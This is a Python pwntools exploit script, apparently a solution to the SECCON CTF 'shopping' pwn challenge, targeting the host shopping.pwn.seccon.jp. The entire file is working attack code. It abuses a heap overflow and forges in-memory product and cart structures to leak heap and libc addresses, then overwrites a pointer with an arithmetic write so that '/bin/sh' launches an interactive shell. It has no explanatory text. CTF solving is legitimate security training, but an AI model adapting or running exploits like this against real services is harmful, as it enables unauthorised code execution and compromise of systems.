from pwn import *
import time
context.log_level = 'debug'

def send(msg):
    time.sleep(0.1)
    r.send(msg)

def m():
    r.recvuntil(": ")

def cr_pr(name, pr, stock=None):
    m()
    send("1\n")
    if stock == None:
        send("%s\n%d\n" % (name, pr))
    else:
        send("%s\n%d\n%d\n" % (name, pr, stock))

def l_pr():
    m()
    send("2\n")
    return r.recvuntil("####")

def cr_crt(name, num):
    m()
    send("1\n%s\n%d\n" % (name, num))

def buy():
    m()
    send("3\n")
    r.recvuntil("purchase.")

def switch():
    m()
    global mode
    if mode == "1":
        mode = "2"
    else:
        mode = "1"
    send("0\n") # out mode
    m()
    send("%s\n" % mode)

def br(name, when):
    r.recvuntil("(y/N) >>")
    send("y\n")
    r.recvuntil("your name  :")
    send(name + "\n")
    r.recvuntil("when crash :")
    send(when + "\n")

def hidden(name=None, reason=None):
    m()
    send("-1\n")
    if name is not None:
        send("y\n")
        m()
        send(name + "\n")
    else:
        send("n\n")

    if reason is not None:
        send("y\n")
        m()
        send(reason + "\n")
    else:
        send("n\n")

def reset_crt():
    m()
    send("4\n")

def leak(addr):
    fake_prod = p64(addr) + "2"*8 + p64(0x40) + p64(0)
    fake_crt = p64(0) * 3

    m()
    send("0\n")
    hidden("A" * 0xd0 + fake_crt + "\x00" * 8 + fake_prod, "B")

    send("1\n") # shop mode

    l = l_pr()
    r.recvuntil("001 : ")
    return u64(r.readline().split("(")[0].ljust(8, "\x00"))

def sub(addr, val):
    fake_prod = "1"*8 + "2"*8 + p64(0x40) + "\x00"*8
    fake_crt = p64(addr - 0x10) + p32(val) + "\x00" * 4 + "\x00" * 8

    m()
    send("0\n")
    hidden("A" * 0xc0 +"\x00" * 8 + p64(0x40) + fake_crt + "\x00"*16 + fake_prod, "B")

    send("2\n")
    buy()

r = remote('shopping.pwn.seccon.jp', 16294)
mode = "1"

m()
send("1\n") # shop mode

cr_pr("a", 65536, 65536)
v = float(l_pr().split("x")[1].split(")")[0])
print("VAR: %f" % v)

switch()
cr_crt("a", (int)(65536 / 2 /   v))
buy()

switch()
br("C" * 0x3e, "C" * 0x3e) # overflow size

cr_pr("a", 1, 4)
switch()

cr_crt("a", 1)
switch() # make heap same

cr_pr("b", 1, 4) # target

heap = leak(0x603118)
print("HEAP: %16X" % heap)
libc_base = leak(0x603060) - 0x0000000000021e50
print("LIBC_BASE: %16X" % libc_base)

sub(0x6030C0, 0x0000000000088710 - 0x0000000000046590)

leak(0x6030C0) # make valid product structure
cr_pr("/bin/sh", 1, 1)
r.interactive()
